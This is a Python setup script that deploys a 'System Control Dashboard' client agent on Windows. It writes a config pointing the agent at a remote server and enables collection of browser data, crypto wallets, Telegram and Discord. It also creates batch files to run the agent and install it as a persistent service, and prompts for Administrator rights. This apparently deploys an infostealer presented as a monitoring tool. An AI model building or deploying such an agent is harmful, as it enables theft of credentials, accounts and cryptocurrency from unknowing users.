#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Setup script for System Control Dashboard Client
"""
import os
import sys
import json
import subprocess
import argparse
import platform
from pathlib import Path

def check_python_version():
    """Check if Python version is compatible"""
    if sys.version_info < (3, 8):
        print("❌ Error: Python 3.8 or higher is required")
        print(f"Current version: {platform.python_version()}")
        return False
    
    print(f"✅ Python version: {platform.python_version()}")
    return True

def install_requirements():
    """Install required packages"""
    print("📦 Installing requirements...")
    
    requirements_file = "client_requirements.txt"
    
    if not os.path.exists(requirements_file):
        print(f"❌ Error: {requirements_file} not found")
        return False
    
    try:
        # Update pip first
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], 
                      check=True, capture_output=True)
        
        # Install requirements
        result = subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file], 
                              check=True, capture_output=True, text=True)
        
        print("✅ Requirements installed successfully")
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"❌ Error installing requirements: {e}")
        print(f"Output: {e.output}")
        return False

def create_config_file(server_url, agent_token, client_name=None):
    """Create configuration file"""
    print("⚙️ Creating configuration file...")
    
    if not client_name:
        client_name = platform.node()
    
    config = {
        "SERVER_URL": server_url,
        "API_URL": f"{server_url}/api",
        "AGENT_TOKEN": agent_token,
        "CLIENT_NAME": client_name,
        "RECONNECT_DELAY": 5,
        "HEARTBEAT_INTERVAL": 30,
        "CONNECTION_TIMEOUT": 30,
        "MAX_RECONNECT_ATTEMPTS": 10,
        "LOG_LEVEL": "INFO",
        "LOG_FILE": "system_agent.log",
        "BACKUP_COMPRESSION": True,
        "BACKUP_ENCRYPTION": False,
        "COLLECT_BROWSER_DATA": True,
        "COLLECT_CRYPTO_WALLETS": True,
        "COLLECT_TELEGRAM": True,
        "COLLECT_DISCORD": True,
        "COLLECT_SYSTEM_INFO": True
    }
    
    config_file = "agent_config.json"
    
    try:
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        
        print(f"✅ Configuration saved to {config_file}")
        return True
        
    except Exception as e:
        print(f"❌ Error creating config file: {e}")
        return False

def test_connection(server_url):
    """Test connection to server"""
    print("🔗 Testing connection to server...")
    
    try:
        import requests
        response = requests.get(f"{server_url}/api/health", timeout=10)
        
        if response.status_code == 200:
            print("✅ Server connection successful")
            return True
        else:
            print(f"⚠️ Server responded with status: {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("❌ Could not connect to server")
        print("Make sure the server URL is correct and the server is running")
        return False
    except requests.exceptions.Timeout:
        print("❌ Connection timeout")
        return False
    except Exception as e:
        print(f"❌ Connection test failed: {e}")
        return False

def create_batch_files():
    """Create batch files for easy execution"""
    print("📄 Creating batch files...")
    
    # Start script
    start_bat = """@echo off
echo Starting System Agent...
python client_agent.py --config agent_config.json
pause"""
    
    # Stop script
    stop_bat = """@echo off
echo Stopping System Agent...
taskkill /F /IM python.exe /FI "WINDOWTITLE eq client_agent*"
echo Agent stopped
pause"""
    
    # Service install script
    service_bat = """@echo off
echo Installing as Windows Service...
python client_agent.py --install-service
pause"""
    
    try:
        with open("start_agent.bat", 'w') as f:
            f.write(start_bat)
        
        with open("stop_agent.bat", 'w') as f:
            f.write(stop_bat)
        
        with open("install_service.bat", 'w') as f:
            f.write(service_bat)
        
        print("✅ Batch files created:")
        print("  - start_agent.bat (اجرای Agent)")
        print("  - stop_agent.bat (متوقف کردن Agent)")  
        print("  - install_service.bat (نصب به عنوان سرویس)")
        return True
        
    except Exception as e:
        print(f"❌ Error creating batch files: {e}")
        return False

def check_admin_privileges():
    """Check if running with admin privileges"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def setup_logging_directory():
    """Create logging directory"""
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    print(f"✅ Log directory created: {log_dir.absolute()}")

def print_final_instructions(server_url, client_name):
    """Print final setup instructions"""
    print("\n" + "="*60)
    print("🎉 SETUP COMPLETED SUCCESSFULLY!")
    print("="*60)
    print(f"✅ Client Name: {client_name}")
    print(f"✅ Server URL: {server_url}")
    print(f"✅ Config File: agent_config.json")
    print(f"✅ OS: {platform.system()} {platform.release()}")
    
    print("\n📋 NEXT STEPS:")
    print("1. Run the agent:")
    print("   Option A: Double-click start_agent.bat")
    print("   Option B: python client_agent.py --config agent_config.json")
    
    print("\n2. Check the dashboard:")
    print(f"   Go to: {server_url}")
    print(f"   Login and look for client: {client_name}")
    
    print("\n3. For production use:")
    print("   - Run install_service.bat as Administrator")
    print("   - This will install the agent as Windows service")
    
    if not check_admin_privileges():
        print("\n⚠️ WARNING: Not running as Administrator")
        print("   Some features may not work properly")
        print("   Right-click and 'Run as Administrator' for full functionality")
    
    print("\n📁 FILES CREATED:")
    files = [
        "agent_config.json",
        "start_agent.bat", 
        "stop_agent.bat",
        "install_service.bat",
        "logs/"
    ]
    for file in files:
        if os.path.exists(file):
            print(f"   ✅ {file}")
    
    print("\n🆘 TROUBLESHOOTING:")
    print("   - Check logs/system_agent.log for errors")
    print("   - Ensure firewall allows Python connections")
    print("   - Verify agent_config.json settings")
    print("="*60)

def main():
    parser = argparse.ArgumentParser(description="Setup System Control Dashboard Client")
    parser.add_argument("--server-url", required=True, help="Dashboard server URL")
    parser.add_argument("--agent-token", required=True, help="Agent authentication token")
    parser.add_argument("--client-name", help="Client identifier name")
    parser.add_argument("--skip-test", action="store_true", help="Skip connection test")
    parser.add_argument("--no-batch", action="store_true", help="Don't create batch files")
    
    args = parser.parse_args()
    
    print("🚀 System Control Dashboard - Client Setup")
    print("="*50)
    
    # Check Python version
    if not check_python_version():
        sys.exit(1)
    
    # Install requirements
    if not install_requirements():
        print("❌ Setup failed: Could not install requirements")
        sys.exit(1)
    
    # Create config file
    client_name = args.client_name or platform.node()
    if not create_config_file(args.server_url, args.agent_token, client_name):
        print("❌ Setup failed: Could not create configuration")
        sys.exit(1)
    
    # Test connection
    if not args.skip_test:
        if not test_connection(args.server_url):
            print("⚠️ Warning: Could not connect to server")
            print("Setup will continue, but check your server URL")
    
    # Create batch files
    if not args.no_batch and platform.system() == "Windows":
        create_batch_files()
    
    # Setup logging
    setup_logging_directory()
    
    # Print final instructions
    print_final_instructions(args.server_url, client_name)
    
    print("\n✅ Setup completed successfully!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n❌ Setup interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Setup failed with error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)